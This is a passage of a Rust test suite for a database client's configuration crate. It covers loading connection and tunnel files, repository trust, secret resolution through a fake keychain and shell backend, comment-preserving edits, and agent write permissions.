//! Configuration tests with temporary directories and a fake secret backend
//! (the real keychain and environment are never touched).

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;

use spelaion_config::{
    ConnectionDraft, ConnectionFile, ConnectionId, Engine, HopDraft, KubernetesDraft, LocalPort,
    Password, PasswordChoice, ResolveError, Resolver, SecretBackend, Source, SshAuth,
    SystemBackend, TlsModeConfig, TrustStore, TunnelDraft, TunnelDraftOptions, TunnelFile,
    TunnelSettings, WritePolicy, add_connection, add_tunnel, connection_account, create_connection,
    delete_tunnel, load, set_value, slug, tunnel_account, update_tunnel,
};
use spelaion_driver_api::{Secret, TlsMode};

/// Temporary directory with a repository and a user directory; deleted at the end.
struct Fixture {
    base: PathBuf,
}

impl Fixture {
    fn new(name: &str) -> Self {
        let base =
            std::env::temp_dir().join(format!("spelaion-config-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join("repo/.spelaion")).unwrap();
        std::fs::create_dir_all(base.join("user")).unwrap();
        Self { base }
    }

    fn repo(&self) -> PathBuf {
        self.base.join("repo")
    }

    fn user(&self) -> PathBuf {
        self.base.join("user")
    }

    fn write(&self, relative: &str, content: &str) -> PathBuf {
        let path = self.base.join(relative);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, content).unwrap();
        path
    }

    /// Trusts the repository as it is now (ADR-022 pins its content).
    fn trusted(&self) -> TrustStore {
        let mut trust = TrustStore::load(&self.user()).unwrap();
        trust
            .trust(&load(Some(&self.repo()), &self.user()))
            .unwrap();
        trust
    }
}

impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.base);
    }
}

#[derive(Default)]
struct FakeBackend {
    keychain: Mutex<BTreeMap<String, String>>,
    env: BTreeMap<String, String>,
    runs: Mutex<Vec<String>>,
    fail_keychain: bool,
}

impl SecretBackend for FakeBackend {
    fn keychain_get(&self, account: &str) -> Result<Option<String>, String> {
        Ok(self.keychain.lock().unwrap().get(account).cloned())
    }

    fn keychain_set(&self, account: &str, secret: &str) -> Result<(), String> {
        if self.fail_keychain {
            return Err("keychain locked".into());
        }
        self.keychain
            .lock()
            .unwrap()
            .insert(account.into(), secret.into());
        Ok(())
    }

    fn keychain_delete(&self, account: &str) -> Result<(), String> {
        if self.fail_keychain {
            return Err("keychain locked".into());
        }
        self.keychain.lock().unwrap().remove(account);
        Ok(())
    }

    fn env(&self, name: &str) -> Option<String> {
        self.env.get(name).cloned()
    }

    fn run(&self, program: &str, args: &[&str]) -> Result<String, String> {
        self.runs
            .lock()
            .unwrap()
            .push(format!("{program} {}", args.join(" ")));
        Ok(format!("output-of-{program}"))
    }

    fn run_shell(&self, command: &str) -> Result<String, String> {
        self.runs.lock().unwrap().push(format!("shell {command}"));
        Ok("output-of-shell".into())
    }
}

/// Keychain entry of a repository connection of the fixture.
fn repo_account(fx: &Fixture, path: &str) -> String {
    connection_account(&load(Some(&fx.repo()), &fx.user()), &ws(path))
}

/// Keychain entry of a hop (from 0) of a repository tunnel of the fixture.
fn repo_hop(fx: &Fixture, tunnel: &str, hop: usize) -> String {
    tunnel_account(
        &load(Some(&fx.repo()), &fx.user()),
        Source::Workspace,
        tunnel,
        hop,
    )
}

fn ws(path: &str) -> ConnectionId {
    ConnectionId {
        source: Source::Workspace,
        path: path.into(),
    }
}

const ORDERS: &str = r#"
schema_version = 1
name = "Orders (prod)"
engine = "postgres"
env = "prod"
host = "orders-${env:REGION}.internal"
database = "orders"
user = "${user.db_user}"
password = { secret = "keychain" }
tunnel = "bastion"

[tls]
mode = "verify-full"
ca = "certs/ca.pem"

[mcp]
exposed = true
max_rows = 500
writes = "allow"
"#;

const BASTION: &str = r#"
schema_version = 1

[[hops]]
host = "jump.example.com"
user = "${user.db_user}"

[[hops]]
host = "10.0.0.5"
port = 2222
user = "deploy"
auth = ["key", "password"]
identity_file = "~/.ssh/id_ed25519"
password = { secret = "prompt" }
"#;

#[test]
fn loads_both_layers_with_folders_and_ids() {
    let fx = Fixture::new("layers");
    fx.write("repo/.spelaion/connections/prod/orders.toml", ORDERS);
    fx.write(
        "repo/.spelaion/connections/local.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"data/app.db\"\n",
    );
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write(
        "user/connections/scratch.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \":memory:\"\n",
    );
    fx.write("user/user.toml", "[vars]\ndb_user = \"ana\"\n");
    std::fs::create_dir_all(fx.repo().join("src/deep")).unwrap();

    // The repository is found from a subdirectory, like git.
    let config = load(Some(&fx.repo().join("src/deep")), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.workspace_root.as_deref(), Some(fx.repo().as_path()));

    let ids: Vec<String> = config
        .connections
        .iter()
        .map(|c| c.id.to_string())
        .collect();
    assert_eq!(ids, ["local", "prod/orders", "~/scratch"]);
    let orders = config.connection(&ws("prod/orders")).unwrap();
    assert_eq!(orders.name(), "Orders (prod)");
    assert_eq!(orders.folders(), ["prod"]);
    assert_eq!(orders.file.mcp.writes, WritePolicy::Allow);
    assert_eq!(config.user.vars["db_user"], "ana");
    assert_eq!(config.tunnels.len(), 1);
}

#[test]
fn broken_files_are_reported_with_position_and_do_not_hide_others() {
    let fx = Fixture::new("broken");
    fx.write(
        "repo/.spelaion/connections/ok.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"a.db\"\n",
    );
    fx.write(
        "repo/.spelaion/connections/typo.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabse = \"a.db\"\n",
    );
    fx.write(
        "repo/.spelaion/connections/syntax.toml",
        "schema_version = 1\nengine = \n",
    );
    fx.write(
        "repo/.spelaion/connections/future.toml",
        "schema_version = 9\nengine = \"sqlite\"\ndatabase = \"a.db\"\n",
    );
    fx.write(
        "repo/.spelaion/connections/incomplete.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\n",
    );
    fx.write(
        "repo/.spelaion/connections/engine.toml",
        "schema_version = 1\nengine = \"oracle\"\n",
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert_eq!(config.connections.len(), 1);
    let problem = |file: &str| {
        config
            .problems
            .iter()
            .find(|p| p.file.ends_with(file))
            .unwrap_or_else(|| panic!("no problem for {file}: {:?}", config.problems))
    };
    let typo = problem("typo.toml");
    assert_eq!((typo.line, typo.column), (Some(3), Some(1)), "{typo}");
    assert!(typo.message.contains("databse"), "{typo}");
    assert_eq!(problem("syntax.toml").line, Some(2));
    assert!(problem("future.toml").message.contains("newer version"));
    assert!(
        problem("incomplete.toml")
            .message
            .contains("database, user")
    );
    assert!(problem("engine.toml").message.contains("oracle"));
}

#[test]
fn workspace_connections_need_trust_but_personal_ones_do_not() {
    let fx = Fixture::new("trust");
    fx.write(
        "repo/.spelaion/connections/db.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"a.db\"\n",
    );
    fx.write(
        "user/connections/mine.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"b.db\"\n",
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();

    let untrusted = TrustStore::load(&fx.user()).unwrap();
    let resolver = Resolver::new(&config, &untrusted, &backend);
    assert!(matches!(
        resolver.resolve(&ws("db")),
        Err(ResolveError::Untrusted { .. })
    ));
    let mine = resolver
        .resolve(&ConnectionId {
            source: Source::User,
            path: "mine".into(),
        })
        .unwrap();
    assert_eq!(Path::new(&mine.params.database), fx.user().join("b.db"));

    // Trust is stored and survives a reload.
    fx.trusted();
    let reloaded = TrustStore::load(&fx.user()).unwrap();
    assert!(reloaded.is_trusted(&fx.repo()));
    let resolved = Resolver::new(&config, &reloaded, &backend)
        .resolve(&ws("db"))
        .unwrap();
    assert_eq!(Path::new(&resolved.params.database), fx.repo().join("a.db"));
}

#[test]
fn resolves_variables_paths_tls_and_tunnels() {
    let fx = Fixture::new("resolve");
    fx.write("repo/.spelaion/connections/prod/orders.toml", ORDERS);
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write("user/user.toml", "[vars]\ndb_user = \"ana\"\n");
    let config = load(Some(&fx.repo()), &fx.user());
    let trust = fx.trusted();
    let backend = FakeBackend {
        env: BTreeMap::from([("REGION".into(), "eu".into())]),
        ..Default::default()
    };
    let r = Resolver::new(&config, &trust, &backend)
        .resolve(&ws("prod/orders"))
        .unwrap();

    assert_eq!(r.engine, Engine::Postgres);
    assert!(r.is_production());
    assert_eq!(r.params.host, "orders-eu.internal");
    assert_eq!(r.params.port, 5432);
    assert_eq!(r.params.user, "ana");
    assert_eq!(r.params.tls, TlsMode::VerifyFull);
    assert_eq!(
        r.params.ca_certificate.as_deref(),
        Some(fx.repo().join("certs/ca.pem").as_path())
    );

    let tunnel = r.tunnel.expect("tunnel");
    assert_eq!(tunnel.hops.len(), 2);
    assert_eq!(
        (
            tunnel.hops[0].host.as_str(),
            tunnel.hops[0].port,
            tunnel.hops[0].user.as_str()
        ),
        ("jump.example.com", 22, "ana")
    );
    assert_eq!(tunnel.hops[0].auth, [SshAuth::Agent]);
    assert_eq!(tunnel.hops[1].port, 2222);
    assert_eq!(tunnel.hops[1].auth, [SshAuth::Key, SshAuth::Password]);
    assert!(
        tunnel.hops[1]
            .identity_file
            .as_ref()
            .unwrap()
            .ends_with(".ssh/id_ed25519")
    );
    assert_eq!(tunnel.hops[1].password, Password::Prompt { save_to: None });
}

#[test]
fn missing_variables_say_what_to_add() {
    let fx = Fixture::new("missing-var");
    fx.write("repo/.spelaion/connections/prod/orders.toml", ORDERS);
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    let config = load(Some(&fx.repo()), &fx.user());
    let trust = fx.trusted();
    let backend = FakeBackend {
        env: BTreeMap::from([("REGION".into(), "eu".into())]),
        ..Default::default()
    };
    match Resolver::new(&config, &trust, &backend).resolve(&ws("prod/orders")) {
        Err(e @ ResolveError::MissingVariables { .. }) => {
            let message = e.to_string();
            assert!(
                message.contains("${user.db_user}") && message.contains("[vars]"),
                "{message}"
            );
        }
        other => panic!("expected a variable error: {other:?}"),
    }
}

fn with_password(fx: &Fixture, secret: &str) -> spelaion_config::Config {
    fx.write(
        "repo/.spelaion/connections/db.toml",
        &format!("schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\npassword = {{ secret = \"{secret}\" }}\n"),
    );
    load(Some(&fx.repo()), &fx.user())
}

#[test]
fn secrets_resolve_from_each_source() {
    let fx = Fixture::new("secrets");
    let backend = FakeBackend {
        env: BTreeMap::from([("PGPASS".into(), "from-env".into())]),
        ..Default::default()
    };
    // Each secret is a new version of the file: trusted as written.
    let password = |secret: &str| {
        let config = with_password(&fx, secret);
        let trust = fx.trusted();
        Resolver::new(&config, &trust, &backend)
            .resolve(&ws("db"))
            .map(|r| r.password)
    };

    assert_eq!(
        password("env:PGPASS").unwrap(),
        Password::Value(Secret::new("from-env"))
    );
    assert_eq!(
        password("op://Infra/db/password").unwrap(),
        Password::Value(Secret::new("output-of-op"))
    );
    assert_eq!(
        password("cmd:pass show db").unwrap(),
        Password::Value(Secret::new("output-of-shell"))
    );
    assert_eq!(
        password("prompt").unwrap(),
        Password::Prompt { save_to: None }
    );
    assert!(matches!(
        password("env:MISSING"),
        Err(ResolveError::Secret { .. })
    ));
    assert!(matches!(
        password("vault://x"),
        Err(ResolveError::Config(_))
    ));

    let runs = backend.runs.lock().unwrap().clone();
    assert_eq!(runs[0], "op read op://Infra/db/password");
    assert_eq!(runs[1], "shell pass show db");
}

#[test]
fn keychain_asks_the_first_time_and_remembers() {
    let fx = Fixture::new("keychain");
    let backend = FakeBackend::default();
    let config = with_password(&fx, "keychain");
    let trust = fx.trusted();
    let resolver = Resolver::new(&config, &trust, &backend);

    let first = resolver.resolve(&ws("db")).unwrap();
    let Password::Prompt {
        save_to: Some(account),
    } = &first.password
    else {
        panic!("the first time it must ask: {:?}", first.password)
    };
    assert_eq!(account, &repo_account(&fx, "db"));
    // Without remembering, the typed password is only used for this connection.
    assert_eq!(
        first.connect_params(Some(Secret::new("typed"))).password,
        Some(Secret::new("typed"))
    );

    resolver
        .remember_password(account, &Secret::new("stored"))
        .unwrap();
    let second = resolver.resolve(&ws("db")).unwrap();
    assert_eq!(second.password, Password::Value(Secret::new("stored")));
    assert_eq!(
        second.connect_params(None).password,
        Some(Secret::new("stored"))
    );
}

#[test]
fn edits_keep_comments_and_layout() {
    let fx = Fixture::new("edit");
    let original = "# Orders database: do not touch on Fridays\nschema_version = 1\nengine = \"postgres\" # engine\nhost = \"old-host\" # change after the migration\ndatabase = \"orders\"\nuser = \"app\"\n";
    let file = fx.write("repo/.spelaion/connections/orders.toml", original);

    set_value(&file, &["host"], "new-host").unwrap();
    set_value(&file, &["tls", "mode"], "verify-full").unwrap();
    let edited = std::fs::read_to_string(&file).unwrap();
    assert!(
        edited.starts_with("# Orders database: do not touch on Fridays\n"),
        "{edited}"
    );
    assert!(
        edited.contains("host = \"new-host\" # change after the migration"),
        "{edited}"
    );
    assert!(
        edited.contains("engine = \"postgres\" # engine"),
        "{edited}"
    );
    assert!(edited.contains("[tls]\nmode = \"verify-full\""), "{edited}");

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.connections[0].file.host.as_deref(), Some("new-host"));

    spelaion_config::remove_value(&file, &["tls", "mode"]).unwrap();
    assert!(
        !std::fs::read_to_string(&file)
            .unwrap()
            .contains("verify-full")
    );
}

#[test]
fn creates_new_connection_files() {
    let fx = Fixture::new("create");
    let dir = fx.repo().join(".spelaion/connections");
    let file = ConnectionFile {
        schema_version: 1,
        name: Some("Analytics".into()),
        engine: Engine::Sqlite,
        env: None,
        host: None,
        port: None,
        database: Some("data/analytics.db".into()),
        user: None,
        password: None,
        tunnel: None,
        local_port: None,
        kubernetes: None,
        sqlite3: None,
        read_only: true,
        keepalive: None,
        tls: Default::default(),
        mcp: Default::default(),
    };
    let path = create_connection(&dir, "team/analytics", &file).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.starts_with("#:schema https://"), "{content}");
    assert!(
        !content.contains("[tls]") && !content.contains("[mcp]"),
        "default values are not written:\n{content}"
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert_eq!(config.connections[0].id.to_string(), "team/analytics");
    assert_eq!(config.connections[0].file, file);

    assert!(
        create_connection(&dir, "team/analytics", &file).is_err(),
        "must not overwrite"
    );
    assert!(
        create_connection(&dir, "../outside", &file).is_err(),
        "must not escape the directory"
    );
}

#[test]
fn json_schemas_are_up_to_date() {
    let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../schema");
    let update = std::env::var("SPELAION_UPDATE_SCHEMA").is_ok();
    for (name, schema) in spelaion_config::json_schemas() {
        let path = dir.join(format!("{name}.schema.json"));
        let expected = serde_json::to_string_pretty(&schema).unwrap() + "\n";
        if update {
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(&path, &expected).unwrap();
        } else {
            let actual = std::fs::read_to_string(&path)
                .unwrap_or_default()
                .replace("\r\n", "\n");
            assert_eq!(
                actual,
                expected,
                "{} is out of date: run SPELAION_UPDATE_SCHEMA=1 cargo test -p spelaion-config",
                path.display()
            );
        }
    }
}

/// The real keychain of this machine (Credential Manager, Keychain or Secret Service). It does
/// not run by default because it writes to the user's keychain and CI usually has none:
/// `cargo test -p spelaion-config -- --ignored`. Creates a test entry and deletes it.
#[test]
#[ignore]
fn system_keychain_round_trip() {
    let account = format!("selftest/{}", std::process::id());
    SystemBackend
        .keychain_set(&account, "test-value")
        .expect("storing in the keychain");
    let read = SystemBackend.keychain_get(&account);
    SystemBackend
        .keychain_delete(&account)
        .expect("deleting the entry");
    assert_eq!(read.unwrap().as_deref(), Some("test-value"));
    assert_eq!(SystemBackend.keychain_get(&account).unwrap(), None);
}

/// Regression: on Windows, Rust escapes quotes as `\"` and `cmd.exe` does not understand it.
/// A command with quotes (paths with spaces) must reach the shell intact.
#[test]
fn shell_commands_keep_their_quotes() {
    let out = SystemBackend
        .run_shell(r#"echo "a b""#)
        .expect("running echo");
    if cfg!(windows) {
        assert_eq!(out, r#""a b""#); // cmd's echo keeps the quotes
    } else {
        assert_eq!(out, "a b");
    }
}

fn postgres_draft() -> ConnectionDraft {
    ConnectionDraft {
        source: Source::Workspace,
        folder: "Prod/EU".into(),
        name: "Orders (prod)".into(),
        engine: Engine::Postgres,
        env: "prod".into(),
        host: " db.internal ".into(),
        port: Some(5432),
        database: "orders".into(),
        user: "app".into(),
        password: PasswordChoice::Keychain,
        tls_mode: TlsModeConfig::VerifyFull,
        tls_ca: String::new(),
        tls_cert: String::new(),
        tls_key: String::new(),
        tunnel: String::new(),
        local_port: None,
        kubernetes: None,
        sqlite3: String::new(),
        read_only: false,
        keepalive: None,
        mcp_exposed: true,
        mcp_writes: false,
    }
}

#[test]
fn slugs_make_safe_file_names() {
    assert_eq!(slug("Orders (prod)"), "orders-prod");
    assert_eq!(slug("  Análisis  2026 "), "analisis-2026");
    assert_eq!(slug("Año Ñandú"), "ano-nandu");
    assert_eq!(slug("日本"), "");
    assert_eq!(slug("a__b--c"), "a__b-c");
    assert_eq!(slug("../.."), "");
}

#[test]
fn new_connections_are_written_without_secrets_and_load_back() {
    let fx = Fixture::new("draft-postgres");
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    let draft = postgres_draft();
    let id = add_connection(
        &config,
        &draft,
        Some(&Secret::new("s3cr3t-value")),
        &backend,
    )
    .unwrap();
    assert_eq!(id, ws("prod/eu/orders-prod"));

    let path = fx
        .repo()
        .join(".spelaion/connections/prod/eu/orders-prod.toml");
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(!content.contains("s3cr3t-value"), "{content}");
    assert!(content.contains("secret = \"keychain\""), "{content}");
    // The default port is implied, so the file only says what differs.
    assert!(!content.contains("port"), "{content}");
    assert!(content.contains("host = \"db.internal\""), "{content}");
    assert_eq!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_account(&fx, "prod/eu/orders-prod"))
            .map(String::as_str),
        Some("s3cr3t-value")
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let entry = config.connection(&id).unwrap();
    assert_eq!(entry.name(), "Orders (prod)");
    assert_eq!(entry.file.tls.mode, TlsModeConfig::VerifyFull);
    assert!(entry.file.mcp.exposed);
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve(&id)
        .unwrap();
    assert_eq!(
        resolved.password,
        Password::Value(Secret::new("s3cr3t-value"))
    );
    assert_eq!(resolved.params.port, 5432);
}

#[test]
fn sqlite_drafts_keep_repository_paths_portable_and_drop_network_fields() {
    let fx = Fixture::new("draft-sqlite");
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft {
        engine: Engine::Sqlite,
        folder: String::new(),
        name: "Local shop".into(),
        database: fx.repo().join("data").join("shop.db").display().to_string(),
        host: "ignored".into(),
        user: "ignored".into(),
        // A tunnel would mean a file on a server (ADR-018): none here.
        tunnel: String::new(),
        password: PasswordChoice::Prompt,
        mcp_exposed: false,
        mcp_writes: false,
        ..postgres_draft()
    };
    let file = draft.to_file(&config).unwrap();
    assert_eq!(file.database.as_deref(), Some("data/shop.db"));
    assert_eq!(
        (file.host, file.user, file.password, file.tunnel),
        (None, None, None, None)
    );
    assert_eq!(file.tls, Default::default());

    // Outside the repository (or for personal connections) the path is kept as typed.
    let outside = std::env::temp_dir()
        .join("elsewhere.db")
        .display()
        .to_string();
    let personal = ConnectionDraft {
        source: Source::User,
        database: outside.clone(),
        ..draft
    };
    assert_eq!(personal.to_file(&config).unwrap().database, Some(outside));
}

#[test]
fn drafts_never_overwrite_and_undo_the_file_if_the_keychain_fails() {
    let fx = Fixture::new("draft-conflict");
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    let draft = postgres_draft();
    add_connection(&config, &draft, Some(&Secret::new("first")), &backend).unwrap();
    // Same identifier: refused, and the stored password of the existing one is untouched.
    assert!(add_connection(&config, &draft, Some(&Secret::new("second")), &backend).is_err());
    assert_eq!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_account(&fx, "prod/eu/orders-prod"))
            .map(String::as_str),
        Some("first")
    );

    let locked = FakeBackend {
        fail_keychain: true,
        ..FakeBackend::default()
    };
    let other = ConnectionDraft {
        name: "Billing".into(),
        ..postgres_draft()
    };
    let err = add_connection(&config, &other, Some(&Secret::new("x")), &locked).unwrap_err();
    assert!(matches!(err, ResolveError::Secret { .. }), "{err}");
    assert!(
        !fx.repo()
            .join(".spelaion/connections/prod/eu/billing.toml")
            .exists()
    );
}

#[test]
fn invalid_drafts_explain_what_is_wrong() {
    let fx = Fixture::new("draft-invalid");
    let config = load(Some(&fx.repo()), &fx.user());
    let error = |draft: ConnectionDraft| draft.to_file(&config).unwrap_err().message;
    assert!(
        error(ConnectionDraft {
            host: " ".into(),
            ..postgres_draft()
        })
        .contains("host")
    );
    assert!(
        error(ConnectionDraft {
            name: "!!".into(),
            ..postgres_draft()
        })
        .contains("name")
    );
    assert!(
        error(ConnectionDraft {
            folder: "ok/!!".into(),
            ..postgres_draft()
        })
        .contains("folder")
    );
    assert!(
        error(ConnectionDraft {
            tunnel: "nope".into(),
            ..postgres_draft()
        })
        .contains("nope")
    );
    for var in ["", "1ABC", "A-B", "A B", "$X"] {
        let draft = ConnectionDraft {
            password: PasswordChoice::Env(var.into()),
            ..postgres_draft()
        };
        assert!(error(draft).contains("environment variable"), "{var}");
    }
    let no_repo = load(None, &fx.user());
    assert!(
        postgres_draft()
            .to_file(&no_repo)
            .unwrap_err()
            .message
            .contains("repository")
    );
}

#[test]
fn drafts_resolve_for_testing_with_the_same_trust_rules() {
    let fx = Fixture::new("draft-resolve");
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    let untrusted = TrustStore::load(&fx.user()).unwrap();
    assert!(matches!(
        Resolver::new(&config, &untrusted, &backend).resolve_draft(&postgres_draft()),
        Err(ResolveError::Untrusted { .. })
    ));
    // Nothing is stored yet, so a keychain draft asks for the typed password.
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve_draft(&postgres_draft())
        .unwrap();
    assert_eq!(
        resolved.password,
        Password::Prompt {
            save_to: Some(repo_account(&fx, "prod/eu/orders-prod"))
        }
    );
    assert_eq!(resolved.params.host, "db.internal");
    assert!(
        !fx.repo().join(".spelaion/connections/prod").exists(),
        "testing writes nothing"
    );

    let personal = ConnectionDraft {
        source: Source::User,
        ..postgres_draft()
    };
    let resolved = Resolver::new(&config, &untrusted, &backend)
        .resolve_draft(&personal)
        .unwrap();
    assert_eq!(resolved.id.to_string(), "~/prod/eu/orders-prod");
}

const HAND_WRITTEN: &str = "# Orders database: owned by the data team\nschema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"db.internal\" # primary\ndatabase = \"orders\"\nuser = \"app\"\npassword = { secret = \"keychain\" }\n\n[mcp]\nexposed = true\nmax_rows = 50 # agents get few rows\nwrites = \"deny\"\n";

#[test]
fn drafts_round_trip_existing_connections() {
    let fx = Fixture::new("draft-roundtrip");
    fx.write("repo/.spelaion/connections/team/orders.toml", HAND_WRITTEN);
    fx.write(
        "repo/.spelaion/connections/vault.toml",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\npassword = { secret = \"op://Infra/db/password\" }\n",
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft::from_entry(config.connection(&ws("team/orders")).unwrap());
    assert_eq!(draft.folder, "team");
    assert_eq!(draft.name, "Orders");
    assert_eq!(draft.password, PasswordChoice::Keychain);
    assert!(draft.mcp_exposed);
    // A reference the form cannot build is shown and kept as is.
    let vault = ConnectionDraft::from_entry(config.connection(&ws("vault")).unwrap());
    assert_eq!(
        vault.password,
        PasswordChoice::Other("op://Infra/db/password".into())
    );
    assert_eq!(vault.name, "vault");
}

#[test]
fn editing_keeps_comments_and_settings_the_form_does_not_show() {
    let fx = Fixture::new("draft-edit");
    let path = fx.write("repo/.spelaion/connections/team/orders.toml", HAND_WRITTEN);
    let config = load(Some(&fx.repo()), &fx.user());
    let id = ws("team/orders");
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_account(&fx, "team/orders"), "old")
        .unwrap();
    let draft = ConnectionDraft {
        name: "Orders (EU)".into(),
        host: "db-eu.internal".into(),
        port: Some(6543),
        tls_mode: TlsModeConfig::Require,
        // Folder and layer cannot move a connection: the file stays where it is.
        folder: "elsewhere".into(),
        source: Source::User,
        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
    };
    spelaion_config::update_connection(&config, &id, &draft, None, &backend).unwrap();

    let content = std::fs::read_to_string(&path).unwrap();
    assert!(
        content.starts_with("# Orders database: owned by the data team\n"),
        "{content}"
    );
    assert!(
        content.contains("host = \"db-eu.internal\" # primary"),
        "{content}"
    );
    assert!(
        content.contains("max_rows = 50 # agents get few rows"),
        "{content}"
    );
    assert!(content.contains("writes = \"deny\""), "{content}");
    assert!(content.contains("port = 6543"), "{content}");
    assert!(content.contains("[tls]\nmode = \"require\""), "{content}");
    assert!(!fx.user().join("connections/elsewhere").exists());
    // An empty password keeps the stored one.
    assert_eq!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_account(&fx, "team/orders"))
            .map(String::as_str),
        Some("old")
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.connection(&id).unwrap().name(), "Orders (EU)");
    assert_eq!(config.connection(&id).unwrap().file.mcp.max_rows, Some(50));
}

#[test]
fn the_form_lets_agents_write_or_only_read() {
    let fx = Fixture::new("draft-mcp-writes");
    let path = fx.write("repo/.spelaion/connections/orders.toml", HAND_WRITTEN);
    let id = ws("orders");
    let backend = FakeBackend::default();
    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft::from_entry(config.connection(&id).unwrap());
    assert!(!draft.mcp_writes);

    let allow = ConnectionDraft {
        mcp_writes: true,
        ..draft.clone()
    };
    spelaion_config::update_connection(&config, &id, &allow, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.contains("writes = \"allow\""), "{content}");
    assert!(
        content.contains("max_rows = 50 # agents get few rows"),
        "{content}"
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.connection(&id).unwrap();
    assert_eq!(entry.file.mcp.writes, WritePolicy::Allow);
    assert!(ConnectionDraft::from_entry(entry).mcp_writes);

    // Back to reading only: the default, so the key goes away.
    spelaion_config::update_connection(&config, &id, &draft, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(!content.contains("writes"), "{content}");

    // A hand-written `confirm` the form cannot show is kept by unrelated edits.
    fx.write(
        "repo/.spelaion/connections/orders.toml",
        &HAND_WRITTEN.replace("writes = \"deny\"", "writes = \"confirm\""),
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let renamed = ConnectionDraft {
        name: "Orders (EU)".into(),
        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
    };
    spelaion_config::update_connection(&config, &id, &renamed, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.contains("writes = \"confirm\""), "{content}");

    // New connections that allow writes say so in their file.
    let file = ConnectionDraft {
        mcp_writes: true,
        ..postgres_draft()
    }
    .to_file(&config)
    .unwrap();
    assert_eq!(file.mcp.writes, WritePolicy::Allow);
}

#[test]
fn editing_the_password_updates_or_forgets_the_keychain_entry() {
    let fx = Fixture::new("draft-edit-password");
    let path = fx.write("repo/.spelaion/connections/orders.toml", HAND_WRITTEN);
    let id = ws("orders");
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_account(&fx, "orders"), "old")
        .unwrap();

    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft::from_entry(config.connection(&id).unwrap());
    spelaion_config::update_connection(&config, &id, &draft, Some(&Secret::new("new")), &backend)
        .unwrap();
    assert_eq!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_account(&fx, "orders"))
            .map(String::as_str),
        Some("new")
    );
    assert!(!std::fs::read_to_string(&path).unwrap().contains("new\""));

    let prompt = ConnectionDraft {
        password: PasswordChoice::Prompt,
        ..draft.clone()
    };
    spelaion_config::update_connection(&config, &id, &prompt, None, &backend).unwrap();
    assert!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_account(&fx, "orders"))
            .is_none()
    );
    assert!(
        std::fs::read_to_string(&path)
            .unwrap()
            .contains("secret = \"prompt\"")
    );

    // If the keychain fails, the file goes back to what it was.
    let config = load(Some(&fx.repo()), &fx.user());
    let before = std::fs::read_to_string(&path).unwrap();
    let locked = FakeBackend {
        fail_keychain: true,
        ..FakeBackend::default()
    };
    let back_to_keychain = ConnectionDraft {
        password: PasswordChoice::Keychain,
        ..draft
    };
    assert!(
        spelaion_config::update_connection(
            &config,
            &id,
            &back_to_keychain,
            Some(&Secret::new("x")),
            &locked
        )
        .is_err()
    );
    assert_eq!(std::fs::read_to_string(&path).unwrap(), before);
}

#[test]
fn invalid_edits_leave_the_file_untouched() {
    let fx = Fixture::new("draft-edit-invalid");
    let path = fx.write("repo/.spelaion/connections/orders.toml", HAND_WRITTEN);
    let config = load(Some(&fx.repo()), &fx.user());
    let id = ws("orders");
